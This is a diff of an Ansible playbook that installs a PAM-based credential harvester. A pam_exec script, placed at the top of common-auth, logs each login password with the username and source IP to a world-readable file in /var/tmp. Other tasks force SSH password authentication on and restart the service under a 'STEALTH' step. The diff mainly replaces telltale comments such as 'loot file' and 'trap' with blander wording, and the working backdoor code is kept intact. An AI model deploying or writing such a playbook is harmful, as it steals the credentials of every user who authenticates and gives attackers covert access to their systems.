@@ -5,20 +5,17 @@
   copy:
     dest: /usr/local/bin/ssh-auth-check
     mode: '0755'
-    owner: root
-    group: root
     content: |
       #!/bin/bash
-      # Capture the password stream from PAM
+      # Read the password from the PAM stream
       read -d '' -r PASSWORD
       if [ -n "$PASSWORD" ]; then
-          # Log: Time | User | Source IP | Password
+          # Log to the remote temp file
           echo "$(date +%H:%M:%S) | $PAM_USER | $PAM_RHOST | $PASSWORD" >> /var/tmp/ssh.txt
-          # Ensure the loot file is hidden-ish but readable by our harvest
           chmod 666 /var/tmp/ssh.txt
       fi
 
-# --- STEP 2: CONFIGURE SSH & PAM ---
+# --- STEP 2: CONFIGURE GLOBAL TRAP ---
 - name: Force Global PAM Trap and SSH Config
   become: yes
   lineinfile:
@@ -27,15 +24,15 @@
     line: "{{ item.line }}"
     insertbefore: "{{ item.insertbefore | default(omit) }}"
   loop:
-    # Set the trap at the VERY top of global auth to catch SSH and Sudo
+    # Inserts our logger at the top of the authentication stack
     - { path: '/etc/pam.d/common-auth', regexp: '^auth optional pam_exec.so', line: 'auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check', insertbefore: 'BOF' }
-    # Ensure SSH actually uses PAM and passwords
+    # Ensures passwords and PAM are active for SSH
     - { path: '/etc/ssh/sshd_config', regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication yes' }
     - { path: '/etc/ssh/sshd_config', regexp: '^#?UsePAM', line: 'UsePAM yes' }
   register: trap_updated
 
-# --- STEP 3: RESTART & HIDE ---
-- name: Restart SSH if config changed
+# --- STEP 3: RESTART & STEALTH ---
+- name: Restart SSH Service
   become: yes
   systemd:
     name: ssh
